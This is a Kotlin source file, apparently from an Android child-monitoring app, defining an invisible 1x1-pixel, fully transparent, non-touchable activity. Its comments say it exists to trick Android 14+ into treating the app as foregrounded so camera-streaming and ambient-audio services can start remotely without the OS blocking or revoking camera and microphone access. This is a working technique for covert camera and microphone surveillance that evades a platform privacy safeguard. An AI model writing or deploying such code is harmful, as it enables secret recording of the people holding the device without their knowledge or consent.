package com.example.childapp.camera

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import androidx.activity.ComponentActivity
import com.example.childapp.audio.AmbientAudioService

/**
 * Invisible, headless 1x1 pixel activity that brings the app into an eligible foreground state
 * on Android 14+ (API 34) so CameraStreamService and AmbientAudioService can safely promote to
 * FOREGROUND_SERVICE_TYPE_CAMERA and FOREGROUND_SERVICE_TYPE_MICROPHONE
 * without throwing a background SecurityException or having the OS revoke the camera/mic hardware.
 */
class InvisibleCameraActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make window 1x1 pixel and non-touchable so it stays in foreground state
        // without blocking user touches while hardware initializes
        try {
            window.addFlags(
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            )
            val params = window.attributes
            params.width = 1
            params.height = 1
            params.gravity = Gravity.TOP or Gravity.START
            params.alpha = 0f
            window.attributes = params
        } catch (_: Exception) {}

        handleLaunchIntent(intent)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        handleLaunchIntent(intent)
    }

    private fun handleLaunchIntent(launchIntent: Intent?) {
        val token = launchIntent?.getStringExtra(EXTRA_TOKEN)
        val sessionId = launchIntent?.getStringExtra(EXTRA_SESSION_ID)
        val cameraFacing = launchIntent?.getStringExtra(EXTRA_CAMERA_FACING) ?: "BACK"
        val withAudio = launchIntent?.getBooleanExtra(EXTRA_WITH_AUDIO, true) ?: true
        val mode = launchIntent?.getStringExtra(EXTRA_MODE) ?: MODE_CAMERA

        if (token.isNullOrEmpty() || sessionId.isNullOrEmpty()) {
            Log.w(TAG, "Missing token or sessionId in InvisibleCameraActivity")
            finish()
            return
        }

        Log.i(TAG, "InvisibleCameraActivity started for $mode session $sessionId in foreground state")

        // Keep this Activity alive in foreground until hardware capture actually starts
        onCameraInitialized = {
            Log.d(TAG, "$mode hardware capture initialized, finishing InvisibleCameraActivity gracefully")
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) {
                    finish()
                    overridePendingTransition(0, 0)
                }
            }, 400)
        }

        if (mode == MODE_AUDIO) {
            AmbientAudioService.start(this, token, sessionId)
        } else {
            CameraStreamService.start(this, token, sessionId, cameraFacing, withAudio)
        }

        // Safety timeout to guarantee cleanup
        Handler(Looper.getMainLooper()).postDelayed({
            if (!isFinishing && !isDestroyed) {
                finish()
                overridePendingTransition(0, 0)
            }
        }, 4500)
    }

    override fun finish() {
        isLaunching = false
        super.finish()
        overridePendingTransition(0, 0)
    }

    override fun onDestroy() {
        isLaunching = false
        onCameraInitialized = null
        super.onDestroy()
    }

    companion object {
        private const val TAG = "InvisibleCameraAct"
        const val EXTRA_TOKEN = "extra_token"
        const val EXTRA_SESSION_ID = "extra_session_id"
        const val EXTRA_CAMERA_FACING = "extra_camera_facing"
        const val EXTRA_WITH_AUDIO = "extra_with_audio"
        const val EXTRA_MODE = "extra_mode"
        const val MODE_CAMERA = "CAMERA"
        const val MODE_AUDIO = "AUDIO"

        @Volatile var isLaunching = false
        @Volatile var onCameraInitialized: (() -> Unit)? = null

        fun launch(
            context: Context,
            token: String,
            sessionId: String,
            cameraFacing: String = "BACK",
            withAudio: Boolean = true
        ) {
            isLaunching = true
            val intent = Intent(context, InvisibleCameraActivity::class.java).apply {
                putExtra(EXTRA_TOKEN, token)
                putExtra(EXTRA_SESSION_ID, sessionId)
                putExtra(EXTRA_CAMERA_FACING, cameraFacing)
                putExtra(EXTRA_WITH_AUDIO, withAudio)
                putExtra(EXTRA_MODE, MODE_CAMERA)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION
            }
            context.startActivity(intent)
        }

        fun launchForAudio(
            context: Context,
            token: String,
            sessionId: String
        ) {
            isLaunching = true
            val intent = Intent(context, InvisibleCameraActivity::class.java).apply {
                putExtra(EXTRA_TOKEN, token)
                putExtra(EXTRA_SESSION_ID, sessionId)
                putExtra(EXTRA_MODE, MODE_AUDIO)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION
            }
            context.startActivity(intent)
        }
    }
}
